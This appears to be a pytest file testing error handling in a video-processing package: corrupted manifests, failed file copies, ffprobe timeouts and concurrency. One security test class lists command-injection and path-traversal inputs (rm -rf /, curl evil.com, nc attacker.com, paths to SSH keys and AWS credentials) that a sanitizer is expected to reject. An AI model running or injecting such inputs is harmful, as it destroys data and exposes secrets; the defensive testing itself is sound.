"""Comprehensive tests for error handling and exception scenarios"""

import json
import os
import subprocess
import threading
import time
from unittest.mock import patch

import pytest

from manim_bridge.core.exceptions import (
    ProcessingError,
    SecurityError,
)
from manim_bridge.processing.hash_calculator import HashCalculator
from manim_bridge.processing.video_processor import VideoProcessor
from manim_bridge.security.command_sanitizer import CommandSanitizer
from manim_bridge.storage.file_operations import AtomicFileOperations
from manim_bridge.storage.manifest_handler import ManifestHandler


class TestManifestCorruption:
    """Test manifest corruption and recovery scenarios"""

    @pytest.fixture
    def manifest_path(self, tmp_path):
        """Create a temporary manifest file path"""
        return tmp_path / "test_manifest.json"

    def test_manifest_recovery_from_corrupted_json(self, manifest_path):
        """Test recovery from corrupted JSON in manifest"""
        # Write corrupted JSON
        manifest_path.write_text("{corrupted json data}")

        handler = ManifestHandler(manifest_path)

        # Should handle corrupted JSON gracefully
        data = handler.read()
        assert data == {}

    def test_manifest_recovery_from_partial_write(self, manifest_path):
        """Test recovery from partial manifest write"""
        # Write partial JSON
        manifest_path.write_text('{"entries": {"test.mp4": {"source"')

        handler = ManifestHandler(manifest_path)
        data = handler.read()

        # Should recover with empty entries
        assert data == {}

    def test_manifest_with_invalid_structure(self, manifest_path):
        """Test handling of manifest with invalid structure"""
        # Write valid JSON but invalid structure
        manifest_path.write_text(json.dumps({"wrong_key": "value"}))

        handler = ManifestHandler(manifest_path)
        data = handler.read()

        # Should handle invalid structure
        assert data == {}

    def test_manifest_concurrent_write_protection(self, manifest_path):
        """Test protection against concurrent manifest writes"""
        handler1 = ManifestHandler(manifest_path)
        handler2 = ManifestHandler(manifest_path)

        # Add different entries to each handler
        handler1.add_entry("file1.mp4", {"hash": "hash1"})
        handler2.add_entry("file2.mp4", {"hash": "hash2"})

        # Save both (should handle locking)
        handler1.write(handler1.read())
        handler2.write(handler2.read())

        # Load fresh and check
        handler3 = ManifestHandler(manifest_path)
        data = handler3.read()

        # At least one entry should be saved
        assert len(data) > 0

    def test_manifest_backup_on_corruption(self, manifest_path):
        """Test that manifest creates backup before recovery"""
        # Write some valid data first
        valid_data = {"entries": {"test.mp4": {"hash": "abc123"}}}
        manifest_path.write_text(json.dumps(valid_data))

        handler = ManifestHandler(manifest_path)
        handler.read()

        # Now corrupt the file
        manifest_path.write_text("corrupted")

        # Create new handler and load
        handler2 = ManifestHandler(manifest_path)
        data = handler2.read()

        # Check for backup file
        backup_files = list(manifest_path.parent.glob("*.backup*"))
        # Backup creation is optional, just ensure no crash
        assert data == {}


class TestFileOperationErrors:
    """Test error handling in file operations"""

    @pytest.fixture
    def file_ops(self):
        """Create file operations instance"""
        return AtomicFileOperations()

    def test_atomic_copy_source_not_found(self, file_ops, tmp_path):
        """Test atomic copy with non-existent source"""
        source = tmp_path / "nonexistent.mp4"
        target = tmp_path / "target.mp4"

        with pytest.raises(ProcessingError, match="Source file not found"):
            file_ops.atomic_copy(source, target)

    def test_atomic_copy_permission_denied(self, file_ops, tmp_path):
        """Test atomic copy with permission issues"""
        source = tmp_path / "source.mp4"
        source.write_bytes(b"data")

        target_dir = tmp_path / "readonly"
        target_dir.mkdir()
        target = target_dir / "target.mp4"

        # Make directory read-only
        os.chmod(target_dir, 0o444)

        try:
            with pytest.raises(ProcessingError):
                file_ops.atomic_copy(source, target)
        finally:
            # Restore permissions for cleanup
            os.chmod(target_dir, 0o755)

    def test_atomic_copy_disk_full_simulation(self, file_ops, tmp_path):
        """Test handling of disk full errors"""
        source = tmp_path / "source.mp4"
        source.write_bytes(b"data" * 1000)
        target = tmp_path / "target.mp4"

        with patch("shutil.copy2", side_effect=OSError("No space left on device")):
            with pytest.raises(ProcessingError, match="Failed to copy"):
                file_ops.atomic_copy(source, target)

    def test_ensure_directory_with_file_conflict(self, file_ops, tmp_path):
        """Test ensure_directory when a file exists with the same name"""
        # Create a file where directory should be
        conflict_path = tmp_path / "should_be_dir"
        conflict_path.write_text("I'm a file")

        # Should handle the conflict
        file_ops.ensure_directory(conflict_path)

        # Should now be a directory
        assert conflict_path.is_dir()


class TestVideoProcessingErrors:
    """Test error handling in video processing"""

    @pytest.fixture
    def video_processor(self):
        """Create video processor instance"""
        return VideoProcessor()

    def test_extract_metadata_corrupted_video(self, video_processor, tmp_path):
        """Test metadata extraction from corrupted video"""
        corrupted = tmp_path / "corrupted.mp4"
        corrupted.write_bytes(b"NOT_A_VIDEO")

        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 1
            mock_run.return_value.stderr = "Invalid data found"

            with pytest.raises(ProcessingError):
                video_processor.extract_metadata(corrupted)

    def test_extract_metadata_timeout(self, video_processor, tmp_path):
        """Test handling of ffprobe timeout"""
        video = tmp_path / "video.mp4"
        video.write_bytes(b"video_data")

        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("ffprobe", 30)):
            with pytest.raises(ProcessingError, match="timeout"):
                video_processor.extract_metadata(video)

    def test_process_video_memory_error(self, video_processor, tmp_path):
        """Test handling of memory errors during processing"""
        video = tmp_path / "video.mp4"
        video.write_bytes(b"video_data")
        output = tmp_path / "output.mp4"

        with patch.object(
            video_processor,
            "extract_metadata",
            side_effect=MemoryError("Out of memory"),
        ):
            with pytest.raises(ProcessingError):
                video_processor.process_video(video, output)


class TestHashCalculatorErrors:
    """Test error handling in hash calculation"""

    @pytest.fixture
    def hash_calc(self):
        """Create hash calculator instance"""
        return HashCalculator()

    def test_calculate_hash_read_error(self, hash_calc, tmp_path):
        """Test hash calculation with read errors"""
        test_file = tmp_path / "test.mp4"
        test_file.write_bytes(b"data")

        with patch("builtins.open", side_effect=OSError("Read error")):
            with pytest.raises(ProcessingError, match="hash calculation failed"):
                hash_calc.calculate_hash(test_file)

    def test_calculate_hash_large_file_memory(self, hash_calc, tmp_path):
        """Test hash calculation memory efficiency for large files"""
        large_file = tmp_path / "large.mp4"

        # Create a "large" file (simulate with small data)
        with open(large_file, "wb") as f:
            for _ in range(100):
                f.write(b"x" * 10000)

        # Should handle large files efficiently
        result = hash_calc.calculate_hash(large_file)
        assert result is not None
        assert len(result) == 64  # SHA256 hash length


class TestSecurityErrors:
    """Test security-related error handling"""

    @pytest.fixture
    def sanitizer(self):
        """Create command sanitizer instance"""
        return CommandSanitizer()

    def test_command_injection_attempts(self, sanitizer):
        """Test detection of command injection attempts"""
        dangerous_inputs = [
            "video.mp4; rm -rf /",
            "video.mp4 && curl evil.com",
            "video.mp4 | nc attacker.com 1234",
            "../../../etc/passwd",
            "$(whoami)",
            "`id`",
            "video.mp4\nrm -rf /",
        ]

        for dangerous in dangerous_inputs:
            with pytest.raises(SecurityError):
                sanitizer.sanitize_filename(dangerous)

    def test_path_traversal_attempts(self, sanitizer):
        """Test detection of path traversal attempts"""
        traversal_attempts = [
            "../../sensitive/file.mp4",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "~/.ssh/id_rsa",
            "${HOME}/.aws/credentials",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(SecurityError):
                sanitizer.sanitize_path(attempt)


class TestConcurrentAccessErrors:
    """Test error handling in concurrent access scenarios"""

    def test_race_condition_file_processing(self, tmp_path):
        """Test handling of race conditions in file processing"""
        test_file = tmp_path / "race.mp4"
        test_file.write_bytes(b"data")

        from manim_bridge.storage.file_operations import AtomicFileOperations

        file_ops = AtomicFileOperations()

        def concurrent_operation():
            try:
                # Try to delete file while it's being processed
                time.sleep(0.1)
                if test_file.exists():
                    test_file.unlink()
            except OSError:
                pass

        # Start concurrent operation
        thread = threading.Thread(target=concurrent_operation)
        thread.start()

        # Try to copy file
        target = tmp_path / "target.mp4"
        try:
            file_ops.atomic_copy(test_file, target)
        except ProcessingError:
            # Expected - file might be deleted
            pass

        thread.join()

    def test_concurrent_manifest_access(self, tmp_path):
        """Test concurrent access to manifest file"""
        manifest_path = tmp_path / "concurrent_manifest.json"

        def write_manifest(handler_id):
            handler = ManifestHandler(manifest_path)
            for i in range(10):
                handler.add_entry(f"file_{handler_id}_{i}.mp4", {"hash": f"hash_{i}"})
                time.sleep(0.01)

        # Start multiple threads writing to manifest
        threads = []
        for i in range(3):
            thread = threading.Thread(target=write_manifest, args=(i,))
            thread.start()
            threads.append(thread)

        # Wait for all threads
        for thread in threads:
            thread.join()

        # Check manifest integrity
        final_handler = ManifestHandler(manifest_path)
        data = final_handler.read()

        # Should have some entries (exact count may vary due to overwriting)
        assert len(data) > 0

    def test_file_lock_timeout(self, tmp_path):
        """Test handling of file lock timeouts"""
        lock_file = tmp_path / "locked.mp4"
        lock_file.write_bytes(b"data")

        from manim_bridge.storage.file_operations import AtomicFileOperations

        file_ops = AtomicFileOperations()

        # Simulate file being locked
        with patch("fcntl.flock", side_effect=OSError("Resource temporarily unavailable")):
            target = tmp_path / "target.mp4"

            # Should handle lock timeout gracefully
            with pytest.raises(ProcessingError):
                file_ops.atomic_copy(lock_file, target)
